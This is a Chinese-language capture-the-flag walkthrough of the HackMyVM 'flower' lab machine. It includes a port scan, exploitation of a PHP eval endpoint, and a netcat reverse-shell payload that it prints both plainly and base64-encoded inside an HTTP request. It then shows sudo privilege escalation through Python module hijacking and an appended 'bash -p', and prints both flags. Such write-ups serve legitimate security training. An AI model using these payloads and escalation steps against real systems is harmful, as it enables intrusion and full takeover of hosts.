### 端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.114
```

```bash
PORT   STATE SERVICE
80/tcp open  http
```

### web端渗透

![image-20241013152748128](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241013152748128.png)

传参为`MjErMzQ=`

base64解码是`21+34`

猜测后端函数是`eval`

```php
<?php
if (isset($_POST["petals"])){
	echo eval("return ".base64_decode($_POST["petals"]).";").' petals ';
}
?>
```

```
system("nc 192.168.56.101 1234 -e /bin/bash");
```

```http
POST / HTTP/1.1
Host: 192.168.56.114
Content-Length: 71
Cache-Control: max-age=0
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.114
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.114/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

petals=c3lzdGVtKCJuYyAxOTIuMTY4LjU2LjEwMSAxMjM0IC1lIC9iaW4vYmFzaCIpOw==
```

### 提权

```bash
(remote) www-data@flower:/home/rose/diary$ sudo -l
Matching Defaults entries for www-data on flower:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```

可以无密码执行`/home/rose/diary/diary.py`

```bash
(remote) www-data@flower:/home/rose/diary$ cat diary.py
import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
```

写入`pickle.py`

```bash
echo "import os;os.system('/bin/bash')" > pickle.py
```

```bash
sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
```

#### user's flag

```bash
rose@flower:~$ cat user.txt 
HMV{R0ses_are_R3d$}
```

```bash
rose@flower:~$ sudo -l
Matching Defaults entries for rose on flower:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rose may run the following commands on flower:
    (root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

```bash
rose@flower:~$ ls -lah /home/rose/.plantbook
-rwx------ 1 rose rose 128 Oct 13 03:22 /home/rose/.plantbook
rose@flower:~$ echo "bash -p" >> /home/rose/.plantbook
rose@flower:~$ cat /home/rose/.plantbook
#!/bin/bash
echo Hello, write the name of the flower that u found
read flower
echo Nice, $flower submitted on : $(date)
bash -p
bash -p
rose@flower:~$ sudo -u root /bin/bash /home/rose/.plantbook
Hello, write the name of the flower that u found

Nice, submitted on : Sun Oct 13 03:35:43 EDT 2024
```

#### root's flag

```bash
root@flower:/home/rose# cat /root/root.txt 
HMV{R0ses_are_als0_black.}
```

